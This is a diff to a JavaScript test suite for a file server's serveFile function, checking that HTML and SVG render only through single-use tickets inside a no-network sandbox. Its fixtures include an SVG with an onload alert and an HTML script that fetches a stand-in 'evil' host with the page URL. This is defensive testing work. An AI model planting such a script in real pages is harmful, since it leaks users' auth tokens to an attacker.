@@ -110,6 +110,7 @@ describe('file explorer: serveFile', function() {
     fs.writeFileSync(path.join(root, 'note.md'), '# md');
     fs.writeFileSync(path.join(root, 'pic.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47]));
     fs.writeFileSync(path.join(root, 'icon.svg'), '<svg onload="alert(1)"></svg>');
+    fs.writeFileSync(path.join(root, 'page.html'), '<script>fetch("//evil/?t="+location)</script>');
     fs.writeFileSync(path.join(root, 'blob.bin'), Buffer.from([1, 2, 3]));
     fs.writeFileSync(path.join(root, '合同备案.txt'), '中文');
     fs.mkdirSync(path.join(root, 'dir'));
@@ -144,9 +145,93 @@ describe('file explorer: serveFile', function() {
     assert.strictEqual(res.headers['Content-Type'], 'image/png');
   });
 
-  it('serves an svg as text/plain, not image/svg+xml (no same-origin script exec)', function() {
+  // The rule these four lock in: a URL that carries a REUSABLE credential never
+  // renders html/svg (the rendered page can read its own location and post it
+  // anywhere); a URL that carries a single-use ticket may render, sandboxed into
+  // an opaque origin with no network.
+  it('serves an svg as text/plain when the URL carries the auth token, not a ticket', function() {
     const res = mockRes();
     server.serveFile(reqParams({ file: path.join(root, 'icon.svg') }), res);
+    assert.strictEqual(res.headers['Content-Type'], 'text/plain; charset=utf-8');
+    assert.ok(!res.headers['Content-Security-Policy'], 'source view needs no sandbox');
+  });
+
+  it('serves an html file as text/plain when the URL carries the auth token', function() {
+    const res = mockRes();
+    server.serveFile(reqParams({ file: path.join(root, 'page.html') }), res);
+    assert.strictEqual(res.headers['Content-Type'], 'text/plain; charset=utf-8');
+  });
+
+  it('renders svg via a ticket, sandboxed and WITHOUT allow-scripts', function() {
+    const ticketRes = mockRes();
+    server.createFileTicket({ body: { path: path.join(root, 'icon.svg') } }, ticketRes);
+    const { ticket } = ticketRes.body;
+
+    const res = mockRes();
+    server.serveFile(reqParams({ token: ticket, file: path.join(root, 'icon.svg') }), res);
+    assert.strictEqual(res.headers['Content-Type'], 'image/svg+xml');
+    const csp = res.headers['Content-Security-Policy'];
+    assert.ok(/(^|;)\s*sandbox\s*;/.test(csp), `svg sandbox must grant nothing: ${csp}`);
+    assert.ok(!csp.includes('allow-scripts'), 'a graphic does not need script');
+    assert.ok(csp.includes("default-src 'none'"), 'no network for a rendered file');
+  });
+
+  it('renders html via a ticket, sandboxed with no network and no popups', function() {
+    const ticketRes = mockRes();
+    server.createFileTicket({ body: { path: path.join(root, 'page.html') } }, ticketRes);
+    const { ticket } = ticketRes.body;
+
+    const res = mockRes();
+    server.serveFile(reqParams({ token: ticket, file: path.join(root, 'page.html') }), res);
+    assert.strictEqual(res.headers['Content-Type'], 'text/html; charset=utf-8');
+    const csp = res.headers['Content-Security-Policy'];
+    assert.ok(csp.includes('sandbox allow-scripts'), 'inlined diagram code must still run');
+    assert.ok(!csp.includes('allow-same-origin'), 'must stay an opaque origin');
+    assert.ok(!csp.includes('allow-popups'), 'window.open is an exfiltration route');
+    assert.ok(csp.includes("default-src 'none'"), 'fetch/img beacons must be blocked');
+  });
+
+  it('spends a ticket on first use — a replay renders nothing', function() {
+    const ticketRes = mockRes();
+    server.createFileTicket({ body: { path: path.join(root, 'page.html') } }, ticketRes);
+    const { ticket } = ticketRes.body;
+
+    const first = mockRes();
+    server.serveFile(reqParams({ token: ticket, file: path.join(root, 'page.html') }), first);
+    assert.strictEqual(first.headers['Content-Type'], 'text/html; charset=utf-8');
+
+    const replay = mockRes();
+    server.serveFile(reqParams({ token: ticket, file: path.join(root, 'page.html') }), replay);
+    assert.strictEqual(replay.headers['Content-Type'], 'text/plain; charset=utf-8');
+  });
+
+  it('with auth on, a spent ticket is not a credential either — replay is 401', function() {
+    const authed = new ClaudeCodeWebServer({ auth: 'secret', folderMode: false });
+    authed.baseFolder = root;
+    try {
+      const ticketRes = mockRes();
+      authed.createFileTicket({ body: { path: path.join(root, 'page.html') } }, ticketRes);
+      const { ticket } = ticketRes.body;
+
+      const first = mockRes();
+      authed.serveFile(reqParams({ token: ticket, file: path.join(root, 'page.html') }), first);
+      assert.strictEqual(first.headers['Content-Type'], 'text/html; charset=utf-8');
+
+      const replay = mockRes();
+      authed.serveFile(reqParams({ token: ticket, file: path.join(root, 'page.html') }), replay);
+      assert.strictEqual(replay.statusCode, 401);
+    } finally {
+      if (typeof authed.dispose === 'function') authed.dispose();
+    }
+  });
+
+  it('will not render a different file than the ticket was minted for', function() {
+    const ticketRes = mockRes();
+    server.createFileTicket({ body: { path: path.join(root, 'page.html') } }, ticketRes);
+    const { ticket } = ticketRes.body;
+
+    const res = mockRes();
+    server.serveFile(reqParams({ token: ticket, file: path.join(root, 'icon.svg') }), res);
     assert.strictEqual(res.headers['Content-Type'], 'text/plain; charset=utf-8');
   });
 
